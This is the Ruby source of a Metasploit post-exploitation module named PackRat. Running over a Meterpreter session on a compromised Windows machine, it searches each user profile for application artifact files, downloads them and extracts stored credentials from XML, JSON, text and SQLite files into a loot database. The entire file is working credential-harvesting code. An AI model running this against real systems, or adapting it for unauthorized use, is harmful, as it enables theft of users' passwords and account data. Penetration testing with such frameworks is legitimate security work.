##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  # this associative array defines the artifacts known to PackRat
  APPLICATION_ARRAY = JSON.parse(
      File.read(File.join(Msf::Config.data_directory, 'packrat', 'artifacts.json')),
      symbolize_names: true
    )

  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Windows Gather Application Artifacts (PackRat)',
      'Description'  => %q{
        This module extracts artifcats from a large list of applications
        and can extract credentials storing content in loot. Full list in
        module documentation.
      },
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          'Daniel Hallsworth',   # Leeds Beckett University student
          'Barwar Salim M',      # Leeds Beckett University student
          'Z. Cliffe Schreuders' # Leeds Beckett University lecturer (http://z.cliffe.schreuders.org)
        ],
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter']
    ))

    register_options(
      [
        OptRegexp.new('REGEX', [false, 'Match a regular expression', '^password']),
        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', 'true']),
        # enumerates the options based on the artifacts that are defined below
        OptEnum.new('APPCATEGORY', [false, 'Category of applications to gather', 'All', APPLICATION_ARRAY.map { |x| x[:category] }.uniq.unshift('All')]),
        OptEnum.new('APPLICATION', [false, 'Specify application to gather', 'All', APPLICATION_ARRAY.map { |x| x[:application] }.uniq.unshift('All')]),
        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', APPLICATION_ARRAY.map { |x| x[:filetypes] }.uniq.unshift('All')])
      ])
  end

  def run
    print_status('Filtering based on these selections:  ')
    print_status("APPCATEGORY: #{datastore['APPCATEGORY'].capitalize}")
    print_status("APPLICATION: #{datastore['APPLICATION'].capitalize}")
    print_status("ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}")

    # used to grab files for each user on the remote host
    grab_user_profiles.each do |userprofile|
      APPLICATION_ARRAY.each do |app_loop|
        download(userprofile, app_loop)
      end
    end

    print_status 'PackRat credential sweep Completed'
  end

  # Check to see if the artifact exists on the remote system.
  def location(profile, opts = {})
    artifact_parent = opts[:file_artifact]
    artifact_parent.each do |artifact_child|
      path = profile[artifact_child[:path]]
      dir = artifact_child[:dir]
      dirs = session.fs.dir.foreach(path).collect
      return dirs.include? dir
    end
  end

  def extract_xml(saving_path, artifact_child, artifact, local_loc)
    xml_file = Nokogiri::XML(File.read(saving_path.to_s))
    credential_array = []
    xml_credential = ''

    artifact_child[:xml_search].each do |xml_split|
      xml_split[:xml].each do |xml_string|
        xml_file.xpath(xml_string.to_s).each do |xml_match|
          vprint_status(xml_split[:extraction_description].to_s)
          print_good xml_match.to_s
          credential_array << xml_match.to_s
        end
      end
    end

    credential_array.each do |xml_write|
      file_save = xml_write.chomp + "\n"
      xml_credential << file_save.to_s
    end
    xml_loot = store_loot("EXTRACTIONS#{artifact}", '', session, xml_credential.to_s, local_loc)
    print_status "File with credentials saved:  #{xml_loot}"
  rescue StandardError => e
    print_status e.to_s
  end

  def extract_regex(saving_path, artifact_child, artifact, local_loc)
    file_string = ''
    File.open(saving_path.to_s, 'rb').each do |file_content|
      file_string << file_content.to_s
    end

    credential_array = []
    cred_save = ''
    user_regex = datastore['REGEX']
    regex_string = user_regex.to_s

    artifact_child[:regex_search].each do |reg_child|
      reg_child[:regex].map { |r| Regexp.new(r) }.each do |regex_to_match|
        if file_string =~ regex_to_match
          file_string.scan(regex_to_match).each do |found_credential|
            file_strip = found_credential.gsub(/\s+/, "").to_s
            vprint_status(reg_child[:extraction_description].to_s)
            print_good file_strip
            credential_array << file_strip
          end
        end
      end
    end

    if file_string =~ user_regex
      file_string.scan(user_regex).each do |user_match|
        user_strip = user_match.gsub(/\s+/, "").to_s
        vprint_status "Searching for #{regex_string}"
        print_good user_strip.to_s
        credential_array << user_strip
      end
    end

    credential_array.each do |file_write|
      file_save = file_write.chomp + "\n"
      cred_save << file_save.to_s
    end
    regex_loot = store_loot("EXTRACTION#{artifact}", '', session, cred_save.to_s, local_loc)
    print_status "File with credentials saved:  #{regex_loot}"
  rescue StandardError => e
    print_status e.to_s
  end

  def extract_sqlite(saving_path, artifact_child, artifact, local_loc)
    database_string = ''
    database_file = SQLite3::Database.open(saving_path.to_s)

    artifact_child[:sql_search].each do |sql_child|
      db = database_file.prepare "SELECT #{sql_child[:sql_column]} FROM #{sql_child[:sql_table]}"
      db_command = db.execute
      db_command.each do |database_row|
        join_info = database_row.join "\s"
        line_split = join_info.chomp + "\n"
        database_string << line_split.to_s
      end
    end

    sql_loot = store_loot("EXTRACTIONS#{artifact}", '', session, database_string.to_s, local_loc)
    print_status "File with credentials saved:  #{sql_loot}"
  rescue StandardError => e
    print_status e.to_s
  end

  def extract_json(saving_path, artifact_child, artifact, local_loc)
    json_file = File.read(saving_path.to_s)
    json_parse = JSON.parse(json_file)
    parent_json_query = ''
    child_json_query = []
    json_credential_save = []
    json_cred = ''

    artifact_child[:json_search].each do |json_split|
      parent_json_query << json_split[:json_parent]
      json_split[:json_children].each do |json_child|
        child_json_query << json_child.to_s
      end
    end

    child_json_query.each do |split|
      children = eval("json_parse#{parent_json_query}")
      children.each do |child_node|
        child = eval("child_node#{split}").to_s
        json_credential_save << "#{split}:  #{child}"
      end
    end

    json_credential_save.each do |json_save|
      file_save = json_save.chomp + "\n"
      print_good file_save.to_s
      json_cred << file_save.to_s
    end
    json_loot = store_loot("EXTRACTIONS#{artifact}", '', session, json_cred.to_s, local_loc)
    print_status "File with credentials saved:  #{json_loot}"
  rescue StandardError => e
    print_status e.to_s
  end

  # Download file from the remote system, if it exists.
  def download(profile, opts = {})
    artifact_parent = opts[:file_artifact]
    artifact_parent.each do |artifact_child|
      category = opts[:category]
      application = opts[:application]
      artifact = artifact_child[:artifact]
      file_type = artifact_child[:filetypes]
      path = artifact_child[:path]
      credential_type = artifact_child[:credential_type]
      description = artifact_child[:description]

      # filter based on options
      if (category != datastore['APPCATEGORY'] && datastore['APPCATEGORY'] != 'All') || (application != datastore['APPLICATION'] && datastore['APPLICATION'] != 'All') || (file_type != datastore['ARTIFACTS'] && datastore['ARTIFACTS'] != 'All')
        # doesn't match search criteria, skip this artifact
        next
      end

      vprint_status("Searching for #{application.capitalize}'s #{artifact.capitalize} in #{profile['UserName']}'s user directory")

      # check if file exists in user's directory on the remote computer.
      if location(profile, opts)
        print_status("#{application.capitalize}'s #{artifact.capitalize} file found")
      else

        vprint_error("#{application.capitalize}'s #{artifact.capitalize} not found in #{profile['UserName']}'s user directory\n")
        # skip non-existing file
        return false
      end

      # loops through apps array and returns each file
      file_directory = "#{profile[path]}\\#{artifact_child[:dir]}"
      files = session.fs.file.search(file_directory, artifact.to_s, true)

      return false unless files

      files.each do |file|
        file_split = file['path'].split('\\')
        local_loc = "#{file_split.last}#{artifact}"
        saving_path = store_loot("#{application}#{artifact}", '', session, '', local_loc)
        file_to_download = "#{file['path']}#{session.fs.file.separator}#{file['name']}"
        print_status("Downloading #{file_to_download}")
        session.fs.file.download_file(saving_path, file_to_download)
        print_status("#{application.capitalize} #{artifact.capitalize} downloaded (#{description})")
        print_good("File saved to:  #{saving_path}\n")

        if credential_type == 'xml'
          extract_xml(saving_path, artifact_child, artifact, local_loc)
        end

        if credential_type == 'json'
          extract_json(saving_path, artifact_child, artifact, local_loc)
        end

        if credential_type == 'text'
          extract_regex(saving_path, artifact_child, artifact, local_loc)
        end

        if credential_type == 'sqlite'
          extract_sqlite(saving_path, artifact_child, artifact, local_loc)
        end

      end
    end
    return true
  end
end

